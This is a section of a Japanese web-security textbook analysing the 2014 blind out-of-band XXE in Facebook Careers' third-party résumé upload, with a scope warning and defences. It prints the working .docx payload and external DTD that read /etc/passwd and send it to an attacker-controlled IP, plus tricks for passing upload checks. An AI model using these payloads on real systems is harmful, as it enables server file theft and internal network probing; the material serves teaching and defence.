- **対象**: Facebook Careers（採用ページ）の履歴書アップロード機能。PDF/DOCX形式のファイルを受け付けていた。なお、この処理を担っていたのはFacebook本体のインフラではなく、採用管理を行うサードパーティ（外部委託）サービスであった
- **脆弱性の種類**: ブラインドXXE（Out-of-Band、アウトオブバンド型）
- **報奨金**: 6,000ドル超（SecurityWeekの報道では最終的に6,300ドルとされる。2014年8月に支払い）
- **対応**: Facebookは当初再現に苦労したが、追加調査の末に脆弱性を認め、パッチを適用した。問題のサービスは本番環境の一部ではなかったため、ユーザーデータやFacebook本体のソースコードへの直接的なリスクはなかったとされる

> ⚠️ **注記（スコープ）**: 本節は既に公開・修正済みの過去の事例を教育目的で解説するものであり、実在サービスへの無許可の検証を推奨するものではない。ここで示すペイロードは、読者自身が管理する検証環境（後述のPortSwigger Web Security AcademyのようなラボやDVWA等）でのみ試すこと。

### なぜ「.docx」がXML攻撃面になるのか

まず前提となる仕組みを理解する必要がある。Microsoft Wordの `.docx` 形式は、2007年以降 **Office Open XML（OOXML）** という規格に基づいており、実体は複数のXMLファイルをZIP圧縮でまとめたコンテナである。実際、`.docx` ファイルの拡張子を `.zip` に変更して解凍すると、以下のような構造が現れる。

```
sample.docx (実体はZIPアーカイブ)
├── [Content_Types].xml   ← パッケージ内の各パートのMIMEタイプを宣言
├── _rels/
│   └── .rels
├── word/
│   ├── document.xml      ← 本文のテキスト・書式情報
│   ├── _rels/
│   │   └── document.xml.rels
│   └── ...
└── docProps/
    ├── core.xml
    └── app.xml
```

これらは**すべてXMLファイル**である。つまり、Wordアプリケーションが `.docx` を開いて描画する際、内部的にはXMLパーサがこれらのファイル群を解析している。同様に、サーバー側で「アップロードされたDOCXからテキストを抽出する」「サムネイルを生成する」「メタデータを読み取る」といった処理を行うライブラリ（Apache POI、PHPWord、python-docx、あるいは各種DOCX→PDF変換ツールなど）も、内部でXMLパーサを呼び出してこれらのファイルを読み込む。

ここが**sink（入力が最終的に実行・解釈される危険な代入先）**となる。XMLパーサがDTD（Document Type Definition、文書型定義。XML文書の構造や、後述する「実体（エンティティ）」と呼ばれる置換規則を宣言する仕組み）の処理をデフォルトで許可した状態で設定されていると、攻撃者は `.docx` パッケージ内のいずれかのXMLファイル（本事例では `word/document.xml` や `[Content_Types].xml` のような、パーサが必ず読み込むファイル）の先頭に、悪意のあるDTD宣言を挿入するだけで、任意の外部実体を注入できる。

WordやOfficeアプリ自身は歴史的にこの種のDTD処理をセキュリティ上の理由で制限してきたが、**サーバー側で自作・または各種ライブラリを組み合わせてDOCXを解析する処理**は、XMLパーサのデフォルト設定（外部実体・外部DTDの解決を許可）のまま実装されているケースが後を絶たなかった。Facebook Careersの事案は、まさにこの「見落とされがちな二次的なXML処理経路」を突いたものである。

### ペイロードの構造と「なぜ動くのか」

Bram.us（Bramus氏、Ramadan氏の手法を後日再現・解説したブログ）に掲載されている再現用ペイロードを見ていく。攻撃者はまず、DOCXパッケージ内のXMLファイル（例えば `word/document.xml`）の先頭近くに以下のDOCTYPE宣言を挿入する。

```xml
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://197.xxx.xxx.90/ext.dtd">
%dtd;
%send;
]]>
```

そして、攻撃者が制御する外部サーバー（IPアドレスは記事内で伏字にされている）に、以下の内容を持つ `ext.dtd` というファイルを設置しておく。

```dtd
<!ENTITY % all
"<!ENTITY % send SYSTEM 'http://197.xxx.xxx.90/FACEBOOK-HACKED?%file;'>"
>
%all;
```

この2段構えの仕組みを、行ごとに分解して説明する。

1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`
   パラメータ実体（`%` 記号を使う、DTD内部でのみ参照できる特殊な実体）`file` を宣言し、その中身をサーバーのローカルファイル `/etc/passwd` の内容として定義する。`SYSTEM` キーワードは「外部リソースを参照せよ」という指示であり、`file://` スキームはローカルファイルシステム上のパスを指す。XMLパーサがこの宣言を評価すると、サーバー上の `/etc/passwd` の中身がまるごと実体 `file` に束縛される。

2. `<!ENTITY % dtd SYSTEM "http://197.xxx.xxx.90/ext.dtd">` および `%dtd;`
   もう1つのパラメータ実体 `dtd` を、攻撃者のサーバーがホストする外部DTDファイルへのURLとして宣言し、`%dtd;` でそれを**展開（呼び出し）**する。これにより、パーサはネットワーク越しに攻撃者のサーバーへHTTPリクエストを送り、`ext.dtd` の中身を取得してその場に読み込む。

3. `ext.dtd` の中身が読み込まれると、そこで宣言されているパラメータ実体 `all` が評価される。この `all` の定義の中で、`%file;` という**実体参照の入れ子**が使われている点が核心である。DTDのパラメータ実体は、他のパラメータ実体の定義の中で再び展開できる（実体の遅延展開）。つまり `all` が展開されると、その中の `%file;` が先ほど読み込んだ `/etc/passwd` の中身に置き換わり、結果として以下のような実体 `send` の宣言が動的に構築される。

   ```dtd
   <!ENTITY % send SYSTEM 'http://197.xxx.xxx.90/FACEBOOK-HACKED?root:x:0:0:root:/root:/bin/bash...(以下/etc/passwdの内容)'>
   ```

4. 元のDOCTYPE宣言の最後にある `%send;` によってこの実体が展開・評価される。すると、パーサは `/etc/passwd` の中身をURLのクエリパラメータとして**そのまま埋め込んだURL**へ、あらためてHTTPリクエストを送信する。攻撃者はこのリクエストを自分のサーバーのアクセスログで受け取ることで、直接レスポンスとしては表示されない（＝盲目＝ブラインドな）はずのファイル内容を、間接的に窃取できる。

このように**外部DTDを2段階で読み込ませ、実体の入れ子展開を利用して読み取ったファイル内容をリクエストURLに埋め込んで外部送信させる**手法は、XXEの分類上「Out-of-Band（OOB）XXE」または「XXE via Parameter Entities（パラメータ実体を用いたXXE）」と呼ばれる典型パターンである。通常のXXE（`&entity;` のような一般実体を本文中に埋め込んでレスポンスにそのまま反映させる手法）が使えない状況——すなわちサーバーがファイル内容をレスポンスに一切返さない「ブラインド」な状況——で有効な、実務上非常に重要なテクニックである。

なぜこの2段階（`%dtd;` で外部DTDを取り込んでから `%all;` を展開する）が必要なのかにも触れておく。XML/DTDの仕様上、**同一のDTD内で、あるパラメータ実体の定義の中で別のパラメータ実体を参照すること（内部サブセット内での実体の入れ子的な再定義）は許可されていない**パーサが多い。そこで、いったん外部DTD（`ext.dtd`）として別ファイルに切り出し、そちらの「外部サブセット」の中で実体の組み合わせを行うことで、この制約を回避している。これは実務上「XXE OOBペイロードは、まず外部DTDファイルを別途用意する必要がある」という定石の技術的根拠でもある。

### Content-Typeやパッケージ検証を回避する工夫

Threatpostの報道によれば、Ramadan氏は `.docx` ファイルをZIPツール（7-Zip）で展開し、パッケージ内の `[Content_Types].xml` のような、パーサが検証・パースの過程で必ず読み込む部分に未検証のペイロードを挿入したと説明している。ここで重要なのは、**アップロードされるファイルの拡張子やContent-Typeヘッダーが「正規のOffice文書らしく」見えても、その内部のXMLパートは自由に改変できる**という点である。多くのアップロード検証は、

- 拡張子が `.docx` であるか
- MIMEタイプ（Content-Type）が `application/vnd.openxmlformats-officedocument.wordprocessingml.document` であるか
- ZIPとして正しく開けるか

といった「コンテナとしての体裁」しか検査せず、**コンテナ内部の個々のXMLファイルにDTD宣言が含まれていないか**まではチェックしない実装が多かった。改変後もZIPとして正しく圧縮し直せば、外見上は正規のWordファイルのままアップロードでき、サーバー側の抽出・解析処理でXMLパーサに渡された瞬間に攻撃が発動する。この「コンテナ形式のファイルアップロードは、内部のXMLパート単位での検査が必要」という教訓は、DOCXに限らずXLSX、PPTX、ODF系文書、さらにはSVGなど、XMLをベースとするあらゆるファイル形式のアップロード機能に共通して当てはまる、本章全体を貫く重要な原則である。

### 想定される悪用シナリオと実際の影響

Threatpost・SecurityWeekの報道をまとめると、Ramadan氏が報告書で言及した潜在的な悪用シナリオは以下の通りである。

- **ローカルファイルの窃取**: `/etc/passwd` に代表される、サーバー上の設定ファイルや機密ファイルの読み取り（本節で示した手法）
- **サービス拒否（DoS）攻撃**: 巨大な実体展開（いわゆる「billion laughs」的な再帰実体展開）によるパーサ・サーバーリソースの枯渇
- **内部ネットワークに対するポートスキャン**: 外部実体のURLスキームとして `http://internal-host:port/` のような内部アドレスを指定し、接続の成否（タイムアウトの有無やレスポンス速度の違い）から内部ネットワークの構成やオープンポートを推測する、SSRF（Server-Side Request Forgery）的な悪用
- **XML形式で保存された内部データへの不正アクセス**: サーバー上に存在する他のXML/設定ファイルの読み取り

なお、SecurityWeekの報道では、Facebook側は「問題のサービスは本番のFacebookインフラの一部ではなく、サードパーティが運用する採用管理システムであったため、ユーザーデータやFacebook本体のソースコードへの直接的なリスクはなかった」とコメントしている。この点は非常に重要な教訓を含んでいる。すなわち、**バグバウンティ・脆弱性診断においては、「.company-domain.com」のようなメインドメインだけでなく、採用ページ・サポートポータル・パートナー向けツールなど、サードパーティが運用する周辺サービスも重大な攻撃対象になり得る**ということである。実際、こうした周辺システムは往々にしてセキュリティレビューの優先度が低く、堅牢なライブラリのアップデートが後回しにされやすい。

### 開示から修正までの経緯

SecurityWeekの報道によれば、Facebookは当初この脆弱性の再現に苦労したという。Ramadan氏が実施したテストコードは、単純に彼自身のコンピュータ上で動作するHTTPサーバーへ接続させるだけのものであり、Facebook側の調査チームが外部通信のログを注意深く追跡する必要があった——これもブラインドXXE特有の「サーバーの挙動から間接的に脆弱性の存在を裏付ける」という調査の難しさを物語っている。最終的にFacebookは脆弱性を認め、パッチを適用し、2014年8月に6,300ドルの報奨金を支払った。Threatpostの報道では、この金額はFacebookが過去に支払った他の重大な脆弱性の報奨金（2014年1月の別のXXE脆弱性に対する33,500ドルなど）と比較するとやや低い水準だったと指摘されているが、これは前述の通り本番インフラへの直接的な影響が限定的だったためと考えられる。

### 修正・防御方法

Bram.usの記事では、PHPにおける代表的な対策として以下のコードが紹介されている。

```php
libxml_disable_entity_loader(true);
```

これは、PHPのlibxml拡張が外部実体（外部DTD・外部エンティティ）の読み込みをデフォルトで許可してしまう挙動を無効化する設定である。呼び出すだけでXMLパーサが外部リソースへ接続しようとする経路そのものを遮断できるため、根本的な対策として広く推奨されてきた（ただしPHP 8.0以降はデフォルトで外部実体読み込みが無効化されており、このAPI自体が非推奨・廃止方向にある点は留意されたい。使用しているPHPバージョンに応じて、SimpleXML/DOMDocumentの `libxml_set_external_entity_loader` や、より新しい安全なデフォルト設定を確認する必要がある）。

より一般に、DOCX/XLSX/PPTXなどOOXML系ファイルを扱うすべてのサーバーサイド処理において、以下の防御原則が本事案から導かれる。

- XMLパーサでは、**DTDの処理自体を無効化する**（外部実体・外部一般実体・外部パラメータ実体の解決をすべて禁止する）のが最も確実な対策である。Java（Apache POI経由でXercesなどを使う場合）であれば `DocumentBuilderFactory` に対して `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` を設定する、あるいは `setExpandEntityReferences(false)` と外部実体解決の禁止を併用する。
- サードパーティのOfficeファイル処理ライブラリ（Apache POI、PHPWord、python-docx、LibreOffice/OpenOfficeのヘッドレス変換パイプラインなど）を利用する場合も、内部で使われているXMLパーサの設定がデフォルトのままになっていないか確認する。ライブラリのバージョンによって挙動が異なるため、依存関係を定期的に更新することも重要である。
- アップロードされたファイルを「コンテナ形式のまま」ではなく、**サンドボックス化された環境で解凍・パースする**（可能であればネットワークアクセスを遮断したコンテナやプロセス内で処理する）ことで、たとえXXEが成立してもOOBでの外部送信自体を阻止できる。
- WAF（Web Application Firewall）やアップロード時のファイルスキャンで、ZIPコンテナ内のXMLパートに `<!DOCTYPE` や `<!ENTITY` といった文字列が含まれていないかを検査する多層防御も有効である（ただし根本対策であるパーサ設定の見直しを代替するものではない）。

### 出典

> 出典: How I Hacked Facebook with a Word Document — https://www.bram.us/2014/12/29/how-i-hacked-facebook-with-a-word-document/

> 出典: XXE Bug Patched In Facebook Careers Third-Party Service — Threatpost — https://threatpost.com/xxe-bug-patched-in-facebook-careers-third-party-service/110151/

> 出典: Facebook Rewards Researcher for Reporting Critical Vulnerability — SecurityWeek — https://www.securityweek.com/facebook-rewards-researcher-reporting-critical-vulnerability/


---

[← 第9章 ツールと方法論](09-tools-methodology.md) ｜ [目次](index.md) ｜ [第11章 発展・方法論・防御の理解 →](11-defense-understanding.md)
